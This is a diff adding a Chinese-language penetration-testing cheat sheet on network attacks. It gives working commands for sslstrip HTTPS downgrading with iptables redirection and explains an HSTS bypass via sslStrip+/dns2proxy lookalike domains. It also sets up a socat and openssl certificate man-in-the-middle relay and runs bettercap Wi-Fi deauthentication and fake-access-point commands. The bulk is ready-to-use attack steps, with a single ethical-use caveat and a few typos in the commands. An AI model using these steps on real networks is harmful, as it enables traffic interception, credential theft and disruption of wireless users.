@@ -1,0 +1,164 @@
+互联网攻击:
+
+sslStrip:
+# 基本上，这种攻击的作用是，当用户试图访问一个重定向到HTTPS版本的HTTP页面时，sslStrip将与客户
+# 端建立HTTP连接并与服务器建立HTTPS连接，从而能够以明文方式嗅探连接。
+apt-get install sslstrip
+
+sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
+#iptables --flush
+#iptables --flush -t nat
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
+
+
+用于绕过HSTS的sslStrip+和dns2proxy:
+# sslStrip+和dns2proxy与sslStrip的区别在于它们会将例如_www.facebook.com_ 重定向
+# 到wwww.facebook.com（注意额外的“w”），并将此域的地址设置为攻击者的IP。这样，客户端将
+# 连接到wwww.facebook.com（攻击者），但在幕后，sslstrip+将通过https与www.facebook.com保持真实连接。
+
+# 这种技术的目标是避免HSTS，因为_wwww.facebook.com_ 不会保存在浏览器的缓存中，所以浏览器会被欺骗
+# 以使用HTTP进行Facebook身份验证。
+
+# 请注意，为了执行此攻击，受害者必须首先尝试访问http://www.faceook.com，而不是https。这可以通
+# 过修改http页面中的链接来完成。
+
+# sslStrip或sslStrip+不再起作用。这是因为浏览器中预先保存了HSTS规则，所以即使用户第一次
+# 访问一个“重要”域，他也会通过HTTPS访问它。此外，请注意，预先保存的规则和其他生成的规则可以使
+# 用标志 includeSubdomains ，因此之前的 wwww.facebook.com 示例将不再起作用，因为
+#  facebook.com 使用带有includeSubdomains的HSTS。
+
+# 待办事项：easy-creds，evilgrade，metasploit，factory
+
+
+在端口上进行TCP监听:
+sudo nc -l -p 80
+socat TCP4-LISTEN:80,fork,reuseaddr -
+
+
+在端口上监听TCP + SSL:
+# 生成密钥和自签名证书
+openssl genrsa -out private.key 2048
+openssl req -new -x509 -sha256 -key private.key -out certificate.crt -days 365
+
+# 启动监听器
+openssl s_server -key private.key -cert certificate.crt -accept <port>
+
+# 使用证书验证连接
+openssl s_client -connect <host>:<port> -CAfile certificate.crt
+
+# 使用nc连接到监听器
+nc -v <host> <port>
+
+# 使用curl连接到监听器
+curl --cacert certificate.crt https://<host>:<port>
+
+FILENAME=server
+# Generate a public/private key pair:
+openssl genrsa -out $FILENAME.key 1024
+# Generate a self signed certificate:
+openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
+# Generate the PEM file by just appending the key and certificate files:
+cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
+
+
+使用证书进行监听:
+# 要执行中间人攻击并拦截网络流量，您可以使用有效的 SSL/TLS 证书。 通过生成与目标域匹配的证书，
+# 您可以与客户端建立安全连接，然后将流量转发到实际服务器。 这使您可以在不引起怀疑的情况下窃听通信
+
+以下是使用证书进行监听的步骤
+    # 获取目标域的SSL/TLS证书：您可以使用openssl或在线服务等工具来检索证书。
+
+    # 生成证书：使用获取到的证书，生成与目标域匹配的新证书。 这可以使用 openssl 等工具或 pyOpenSSL 等库来完成。
+
+    # 设置代理：配置代理服务器，例如Burp Suite或mitmproxy，以拦截客户端和服务器之间的流量。
+
+    # 安装生成的证书：将生成的证书导入客户端的信任存储区。 这将允许客户端与代理服务器建立安全连接。
+
+    # 转发流量：客户端与代理服务器建立连接后，将流量转发到实际服务器。 这可以由代理服务器自动完成
+
+# 通过使用有效的 SSL/TLS 证书，您可以有效地侦听网络流量而不会引起怀疑。 然而，值得注意的是
+# ，这种技术只能用于道德目的，例如渗透测试或网络安全评估。
+sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
+
+
+使用证书进行监听并重定向到主机:
+要使用证书侦听并重定向到主机，您可以按照以下步骤操作
+    # 生成自签名证书或从受信任的证书颁发机构 (CA) 获取有效证书。
+
+    # 配置 Web 服务器以使用 SSL/TLS 加密证书。
+
+    # 设置适当的 DNS 记录以将所需主机重定向到侦听服务器的 IP 地址。
+
+    # 修改本地计算机或目标计算机上的主机文件，将所需主机重定向到侦听服务器的 IP 地址。
+
+    # 启动侦听服务器并确保其配置正确以处理传入的 SSL/TLS 连接。
+
+    # 当客户端连接到重定向的主机之一时，将使用证书进行 SSL/TLS 握手。 客户端将与您的侦听服务器建立安全连接。
+
+    # 然后，您可以拦截并分析客户端和重定向主机之间的流量。
+
+# 通过使用证书侦听和重定向流量，您可以有效地执行中间人攻击并获取对客户端和重定
+# 向主机之间交换的敏感信息的访问权限
+sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
+
+# 有时，如果客户端检查CA是否有效，你可以提供由CA签名的其他主机名的证书。
+# 另一个有趣的测试是提供请求的主机名的自签名证书。
+
+# 其他要测试的内容包括尝试使用有效证书签名，但该证书不是有效的CA。或者使用有效的公钥，强制使用
+# 诸如Diffie-Hellman之类的算法（不需要使用真实私钥解密任何内容），当客户端请求真实私钥
+# 的探测（如哈希）时，发送一个伪造的探测，并期望客户端不会检查这一点。
+
+
+Bettercap:
+# Events
+events.stream off #Stop showing events
+events.show #Show all events
+events.show 5 #Show latests 5 events
+events.clear
+
+# Ticker (loop of commands)
+set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on
+
+# Caplets
+caplets.show
+caplets.update
+
+# Wifi
+wifi.recon on
+wifi.deauth BSSID
+wifi.show
+# Fake wifi
+set wifi.ap.ssid Banana
+set wifi.ap.bssid DE:AD:BE:EF:DE:AD
+set wifi.ap.channel 5
+set wifi.ap.encryption false #If true, WPA2
+wifi.recon on; wifi.ap
+
+主动发现笔记
+# 请注意，当向一个没有请求的端口发送UDP数据包时，会发送一个ICMP（端口不可达）。
+
+ARP发现
+# ARP数据包用于发现网络中正在使用的IP地址。PC必须对每个可能的IP地址发送请求，只有正在使用的IP地址才会响应。
+
+mDN 多播DNS
+# Bettercap发送一个MDNS请求（每X毫秒一次），请求的内容是 _services_.dns-sd._udp.local，能看到这个数据包的机器通常会回应这个请求。然后，它只搜索回应“services”的机器。
+工具
+    # Avahi-browser（--all）
+    # Bettercap（net.probe.mdns）
+    # Responder
+
+NBNS NetBios名称服务器
+# Bettercap广播数据包到端口137/UDP，请求名称为“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。
+
+SSDP 简单服务发现协议
+# Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。
+
+WSD Web服务发现
+# Bettercap广播WSD数据包，搜索服务（UDP端口3702）。
+
+
+
+
